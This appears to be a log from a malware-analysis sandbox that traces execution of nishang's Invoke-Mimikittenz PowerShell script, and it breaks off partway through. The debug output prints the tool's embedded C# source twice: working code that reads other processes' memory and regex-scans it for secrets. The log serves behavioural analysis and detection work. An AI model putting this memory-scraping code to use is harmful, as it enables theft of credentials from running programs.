
Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00.015290

====================================================================================================
added pid 0 of                        background-process System Idle Process                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                        background-process System                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                        background-process Registry                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 320 of                        background-process smss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 436 of                        background-process csrss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 512 of                        background-process wininit.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 520 of                        background-process csrss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 576 of                        background-process winlogon.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 648 of                        background-process services.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 664 of                        background-process lsass.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 764 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1020 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1036 of                        background-process SearchIndexer.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1048 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1140 of                        background-process sshd.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1200 of                        background-process MemCompression                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1692 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1720 of                        background-process spoolsv.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1844 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2028 of                        background-process MsMpEng.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2108 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                        background-process SgrmBroker.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2860 of                        background-process uhssvc.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4108 of                        background-process SecurityHealthService.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4200 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 6340 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 424 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1028 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1160 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1380 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1452 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1616 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1624 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1836 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2052 of                        background-process dasHost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2088 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2264 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2780 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5872 of                        background-process audiodg.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 884 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1384 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2572 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6


spawned_shell_process 11052's parent-process is indeed the main-python-process python3.10.exe : 5112


Finished Blacklisting Main-Python-Process 5112

PS C:\malware> Trace-Command -Name metadata, parameterbinding, cmdlet -Expression {. "C:\Users\puma-4\Desktop\nishang-master\Gather\Invoke-Mimikittenz.ps1";Invoke-Mimikittenz} -PSHost;
DEBUG: ParameterBinding Information: 0 : BIND NAMED cmd line args [New-Object]
DEBUG: ParameterBinding Information: 0 :     BIND arg [System.CodeDom.Compiler.CompilerParameters] to parameter 
[TypeName]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
DEBUG: ParameterBinding Information: 0 :         Executing VALIDATION metadata: 
[System.Management.Automation.ValidateTrustedDataAttribute]
DEBUG: ParameterBinding Information: 0 :         BIND arg [System.CodeDom.Compiler.CompilerParameters] to param 
[TypeName] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [New-Object]
DEBUG: ParameterBinding Information: 0 : MANDATORY PARAMETER CHECK on cmdlet [New-Object]
DEBUG: ParameterBinding Information: 0 : CALLING BeginProcessing
DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing

*SUSPENDED the spawned-powershell-process 11052 due to: 'DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing
'

sleep now : for 300 seconds
wake up now : as 300 seconds past

Finished All Close-Traces-- Elapsed-Time: 0:00:00.095694

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:00.419880
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:00
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00

Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00.015209

====================================================================================================
added pid 0 of                                                background-process System Idle Process                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                                                background-process System                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                                                background-process Registry                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 320 of                                                background-process smss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 436 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 512 of                                                background-process wininit.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 520 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 576 of                                                background-process winlogon.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 648 of                                                background-process services.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 664 of                                                background-process lsass.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 764 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1020 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1036 of                                                background-process SearchIndexer.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1048 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1140 of                                                background-process sshd.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1200 of                                                background-process MemCompression                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1692 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1720 of                                                background-process spoolsv.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1844 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2028 of                                                background-process MsMpEng.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2108 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                                                background-process SgrmBroker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2860 of                                                background-process uhssvc.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4108 of                                                background-process SecurityHealthService.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4200 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 6340 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9884 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 424 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1028 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1160 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1380 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1452 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1616 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1624 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1836 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2052 of                                                background-process dasHost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2088 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2264 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2780 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 884 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1384 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2572 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================

Finished Blacklisting Main-Python-Process 5112


*RESUMED the spwaned-powershell-process 11052

DEBUG: ParameterBinding Information: 0 :     BIND arg [using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.IO;

namespace mimikittenz
{
    public class MemProcInspector
    {
        static MemProcInspector()
        {
            InitRegexes();
        }



        public static void SaveToFile(string fileName, List<MatchInfo> matches)
        {
            StringBuilder builder = new StringBuilder();
            foreach (MatchInfo s in matches)
            {
                builder.AppendLine(s.PatternMatch);
            }
            File.WriteAllText(fileName, builder.ToString());

        }

        public static void AddRegex(string name, string pattern)
        {
            regexes.Add(new RegexRecord(name, pattern));
        }

        public static List<RegexRecord> regexes = new List<RegexRecord>();

        public static List<MatchInfo> InspectManyProcs(params string[] procNames)
        {



            List<MatchInfo> lstMatch = new List<MatchInfo>();
            string res = "None";
            foreach (string procName in procNames)
            {
                try
                {

                    Process[] procs = Process.GetProcessesByName(procName);
                    foreach (Process pr in procs)
                    {
                        Process process = pr;

                        res = InspectProc(process, ref lstMatch);

                    }
                }
                catch (Exception ex)
                {
                    res = ex.Message;
                    res = ex.StackTrace;
                }
            }
            List<string> lstToReturn = new List<string>();

            return lstMatch;
        }

        private static void InitRegexes()
        {
            regexes.Clear();
        }



        private static string InspectProc(Process process, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, 
false, process.Id);
            if (processHandle.ToInt64() == 0)
            {
                int err = Marshal.GetLastWin32Error();

            }

            res = SearchProc(processHandle, ref  lstMatch);
            MInterop.CloseHandle(processHandle);
            return res;
        }

        private static string SearchProc(IntPtr processHandle, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            MInterop.SYSTEM_INFO si = new MInterop.SYSTEM_INFO();
            MInterop.GetSystemInfo(out si);

            long createdSize = 1;
            byte[] lpBuffer = new byte[createdSize];

            Int64 total = 0;

            long regionStart = si.minimumApplicationAddress.ToInt64(); //(BYTE*)si.lpMinimumApplicationAddress;
            bool skipRegion = false;
            bool stop = false;
            //while (regionStart < Math.Min(0x7ffeffff, si.maximumApplicationAddress.ToInt64()) && !stop)
            while (regionStart < si.maximumApplicationAddress.ToInt64() && !stop)
            {
                //MInterop.MEMORY_BASIC_INFORMATION memInfo;
                MInterop.MEMORY_BASIC_INFORMATION memInfo;

                long regionRead = 0;
                long regionSize;
                int resulq = MInterop.VirtualQueryEx(processHandle, (IntPtr)regionStart, out memInfo, 
(uint)Marshal.SizeOf(typeof(MInterop.MEMORY_BASIC_INFORMATION)));
                if (resulq == 0)
                {
                    //XVERBOSE(L"VirtualQueryEx error %d\n", GetLastError());
                    int err = Marshal.GetLastWin32Error();
                    Marshal.ThrowExceptionForHR(err);
                    break;
                }
                regionSize = (memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64() - regionStart);
                if (MInterop.IsDataRegion(memInfo) == false)
                {

                }
                if (skipRegion)
                {
                    skipRegion = false;
                }
                else
                    if (MInterop.IsDataRegion(memInfo))
                    {

                        if (createdSize < regionSize)
                        {
                            createdSize = regionSize;
                            lpBuffer = new byte[createdSize];
                        }
                        bool resRead = false;
                        try
                        {
                            resRead = MInterop.ReadProcessMemory(processHandle, new IntPtr(regionStart), lpBuffer, 
regionSize, out regionRead);
                        }
                        catch //(AccessViolationException ex)
                        {
                            resRead = false;
                        }
                        //  result |= SearchRegion(process, regionStart, regionSize, regexData, regionRead, buffer);
                        regionSize = (int)regionRead;
                        if (!resRead)
                        {
                            // looks like the memory state has been altered by the target process
                            // between our VirtualQueryEx and ReadProcessMemory calls ->
                            // learn the size of the changed region and jump over it on the next iteration
                            skipRegion = true;
                            //XVERBOSE(L"Skipping a non-readable region\n");
                        }
                        if (resRead)
                        {
                            List<string> strsTolook = new List<string>();
                            string str1 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0, (int)regionRead);
                            string str11 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0 + 1, (int)regionRead - 1);
                            string str4 = UnicodeEncoding.ASCII.GetString(lpBuffer, 0, (int)regionRead);
                            strsTolook.Add(str1);
                            strsTolook.Add(str4);
                            strsTolook.Add(str11);

                            foreach (RegexRecord regexRec in regexes)
                            {

                                foreach (string str in strsTolook)
                                {
                                    MatchCollection matches3 = regexRec.Regex.Matches(str);
                                    if (matches3.Count > 0)
                                    {
                                        for (int i = 0; i < matches3.Count; i++)
                                            if (matches3[i].Success && IsMatchesContain(lstMatch, matches3[i].Value) ==
 false && IsRegexRecordsContain(matches3[i].Value) == false)
                                            {
                                                MatchInfo m = new MatchInfo();
                                                m.PatternName = regexRec.Name;
                                                m.PatternMatch = matches3[i].Value;

                                                lstMatch.Add(m);
                                            }
                                        res = matches3[0].Value;


                                    }
                                }
                            }


                        }

                        total += regionSize;
                    }
                regionStart += regionSize;
                //stop = IsStop(stopEvent);
            }
            //XVERBOSE(L"Totally searched %lu bytes\n", total);
            //return result;
            return res;
        }

        private static bool IsMatchesContain(List<MatchInfo> matches, string val)
        {
            foreach (MatchInfo item in matches)
            {
                if (string.Compare(item.PatternMatch, val) == 0)
                    return true;
            }
            return false;
        }

        private static bool IsRegexRecordsContain(string pattern)
        {
            foreach (RegexRecord item in regexes)
            {
                if (string.Compare(item.Pattern, pattern) == 0)
                    return true;
            }
            return false;
        }


        const int MAX_PREFIX_LENGTH = 1;
        // the essence
        // estimated upper limit to allocate enough buffers
        const int MAX_MATCH_LENGTH = 1024;

        // the buffer should be large enough to contain at least MAX_CHECK_LENGTH*sizeof(wchar_t) bytes
        const int DEFAULT_SEARCH_BUFFER_SIZE = (10 * 1024 * 1024);
        // the upper limit of the buffer size
        const int MAX_SEARCH_BUFFER_SIZE = (25 * 1024 * 1024);


    }

    public class MatchInfo
    {

        public string PatternName;
        public string PatternMatch;

        // public string ProccesName { get; set; }

    }
    public class RegexRecord
    {
        Regex mRegex;

        protected RegexRecord()
        {

        }

        public RegexRecord(string name, string pattern)
        {
            Name = name;
            Pattern = pattern;
            mRegex = new Regex(pattern);
        }

        public Regex Regex { get { return mRegex; } }



        public string Name;


        public string Pattern;



    }

    public class MInterop
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess,
          IntPtr lpBaseAddress, byte[] lpBuffer, long dwSize, out long lpNumberOfBytesRead);

        public const int PROCESS_WM_READ = 0x0010;
        public const int PROCESS_QUERY_INFORMATION = 0x00000400;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION 
lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION32
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public short aligment;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
            public short aligment2;
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        [DllImport("kernel32.dll")]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        internal static bool IsDataRegion(MEMORY_BASIC_INFORMATION memInfo)
        {

            bool res =    // check this is a live (not free/reserved) memory
            (memInfo.State & (uint)StateEnum.MEM_COMMIT) != 0 &&
                // don't examine memory mapped files sections / PE images
                //  (memInfo.Type & (uint)TypeEnum.MEM_PRIVATE) != 0 &&
                // don't read PAGE_GUARD memory to avoid altering target state
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_NOACCESS | (uint)AllocationProtect.PAGE_GUARD)) == 0
            &&
                // make sure the memory is readable
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_READONLY | (uint)AllocationProtect.PAGE_READWRITE |
            (uint)AllocationProtect.PAGE_EXECUTE_READ | (uint)AllocationProtect.PAGE_EXECUTE_READWRITE | 
(uint)AllocationProtect.PAGE_EXECUTE_WRITECOPY)) != 0;

            return res;
        }

        public enum ProcessAccessTypes
        {
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_SET_SESSIONID = 0x00000004,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x00000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            SYNCHRONIZE = 0x00100000,
            PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | 
PROCESS_VM_OPERATION |
              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
              PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE
        }
    }
}

] to parameter [TypeDefinition]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
DEBUG: ParameterBinding Information: 0 :         Executing VALIDATION metadata: 
[System.Management.Automation.ValidateTrustedDataAttribute]
DEBUG: ParameterBinding Information: 0 :         BIND arg [using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.IO;

namespace mimikittenz
{
    public class MemProcInspector
    {
        static MemProcInspector()
        {
            InitRegexes();
        }



        public static void SaveToFile(string fileName, List<MatchInfo> matches)
        {
            StringBuilder builder = new StringBuilder();
            foreach (MatchInfo s in matches)
            {
                builder.AppendLine(s.PatternMatch);
            }
            File.WriteAllText(fileName, builder.ToString());

        }

        public static void AddRegex(string name, string pattern)
        {
            regexes.Add(new RegexRecord(name, pattern));
        }

        public static List<RegexRecord> regexes = new List<RegexRecord>();

        public static List<MatchInfo> InspectManyProcs(params string[] procNames)
        {



            List<MatchInfo> lstMatch = new List<MatchInfo>();
            string res = "None";
            foreach (string procName in procNames)
            {
                try
                {

                    Process[] procs = Process.GetProcessesByName(procName);
                    foreach (Process pr in procs)
                    {
                        Process process = pr;

                        res = InspectProc(process, ref lstMatch);

                    }
                }
                catch (Exception ex)
                {
                    res = ex.Message;
                    res = ex.StackTrace;
                }
            }
            List<string> lstToReturn = new List<string>();

            return lstMatch;
        }

        private static void InitRegexes()
        {
            regexes.Clear();
        }



        private static string InspectProc(Process process, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, 
false, process.Id);
            if (processHandle.ToInt64() == 0)
            {
                int err = Marshal.GetLastWin32Error();

            }

            res = SearchProc(processHandle, ref  lstMatch);
            MInterop.CloseHandle(processHandle);
            return res;
        }

        private static string SearchProc(IntPtr processHandle, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            MInterop.SYSTEM_INFO si = new MInterop.SYSTEM_INFO();
            MInterop.GetSystemInfo(out si);

            long createdSize = 1;
            byte[] lpBuffer = new byte[createdSize];

            Int64 total = 0;

            long regionStart = si.minimumApplicationAddress.ToInt64(); //(BYTE*)si.lpMinimumApplicationAddress;
            bool skipRegion = false;
            bool stop = false;
            //while (regionStart < Math.Min(0x7ffeffff, si.maximumApplicationAddress.ToInt64()) && !stop)
            while (regionStart < si.maximumApplicationAddress.ToInt64() && !stop)
            {
                //MInterop.MEMORY_BASIC_INFORMATION memInfo;
                MInterop.MEMORY_BASIC_INFORMATION memInfo;

                long regionRead = 0;
                long regionSize;
                int resulq = MInterop.VirtualQueryEx(processHandle, (IntPtr)regionStart, out memInfo, 
(uint)Marshal.SizeOf(typeof(MInterop.MEMORY_BASIC_INFORMATION)));
                if (resulq == 0)
                {
                    //XVERBOSE(L"VirtualQueryEx error %d\n", GetLastError());
                    int err = Marshal.GetLastWin32Error();
                    Marshal.ThrowExceptionForHR(err);
                    break;
                }
                regionSize = (memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64() - regionStart);
                if (MInterop.IsDataRegion(memInfo) == false)
                {

                }
                if (skipRegion)
                {
                    skipRegion = false;
                }
                else
                    if (MInterop.IsDataRegion(memInfo))
                    {

                        if (createdSize < regionSize)
                        {
                            createdSize = regionSize;
                            lpBuffer = new byte[createdSize];
                        }
                        bool resRead = false;
                        try
                        {
                            resRead = MInterop.ReadProcessMemory(processHandle, new IntPtr(regionStart), lpBuffer, 
regionSize, out regionRead);
                        }
                        catch //(AccessViolationException ex)
                        {
                            resRead = false;
                        }
                        //  result |= SearchRegion(process, regionStart, regionSize, regexData, regionRead, buffer);
                        regionSize = (int)regionRead;
                        if (!resRead)
                        {
                            // looks like the memory state has been altered by the target process
                            // between our VirtualQueryEx and ReadProcessMemory calls ->
                            // learn the size of the changed region and jump over it on the next iteration
                            skipRegion = true;
                            //XVERBOSE(L"Skipping a non-readable region\n");
                        }
                        if (resRead)
                        {
                            List<string> strsTolook = new List<string>();
                            string str1 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0, (int)regionRead);
                            string str11 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0 + 1, (int)regionRead - 1);
                            string str4 = UnicodeEncoding.ASCII.GetString(lpBuffer, 0, (int)regionRead);
                            strsTolook.Add(str1);
                            strsTolook.Add(str4);
                            strsTolook.Add(str11);

                            foreach (RegexRecord regexRec in regexes)
                            {

                                foreach (string str in strsTolook)
                                {
                                    MatchCollection matches3 = regexRec.Regex.Matches(str);
                                    if (matches3.Count > 0)
                                    {
                                        for (int i = 0; i < matches3.Count; i++)
                                            if (matches3[i].Success && IsMatchesContain(lstMatch, matches3[i].Value) ==
 false && IsRegexRecordsContain(matches3[i].Value) == false)
                                            {
                                                MatchInfo m = new MatchInfo();
                                                m.PatternName = regexRec.Name;
                                                m.PatternMatch = matches3[i].Value;

                                                lstMatch.Add(m);
                                            }
                                        res = matches3[0].Value;


                                    }
                                }
                            }


                        }

                        total += regionSize;
                    }
                regionStart += regionSize;
                //stop = IsStop(stopEvent);
            }
            //XVERBOSE(L"Totally searched %lu bytes\n", total);
            //return result;
            return res;
        }

        private static bool IsMatchesContain(List<MatchInfo> matches, string val)
        {
            foreach (MatchInfo item in matches)
            {
                if (string.Compare(item.PatternMatch, val) == 0)
                    return true;
            }
            return false;
        }

        private static bool IsRegexRecordsContain(string pattern)
        {
            foreach (RegexRecord item in regexes)
            {
                if (string.Compare(item.Pattern, pattern) == 0)
                    return true;
            }
            return false;
        }


        const int MAX_PREFIX_LENGTH = 1;
        // the essence
        // estimated upper limit to allocate enough buffers
        const int MAX_MATCH_LENGTH = 1024;

        // the buffer should be large enough to contain at least MAX_CHECK_LENGTH*sizeof(wchar_t) bytes
        const int DEFAULT_SEARCH_BUFFER_SIZE = (10 * 1024 * 1024);
        // the upper limit of the buffer size
        const int MAX_SEARCH_BUFFER_SIZE = (25 * 1024 * 1024);


    }

    public class MatchInfo
    {

        public string PatternName;
        public string PatternMatch;

        // public string ProccesName { get; set; }

    }
    public class RegexRecord
    {
        Regex mRegex;

        protected RegexRecord()
        {

        }

        public RegexRecord(string name, string pattern)
        {
            Name = name;
            Pattern = pattern;
            mRegex = new Regex(pattern);
        }

        public Regex Regex { get { return mRegex; } }



        public string Name;


        public string Pattern;



    }

    public class MInterop
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess,
          IntPtr lpBaseAddress, byte[] lpBuffer, long dwSize, out long lpNumberOfBytesRead);

        public const int PROCESS_WM_READ = 0x0010;
        public const int PROCESS_QUERY_INFORMATION = 0x00000400;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION 
lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION32
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public short aligment;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
            public short aligment2;
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
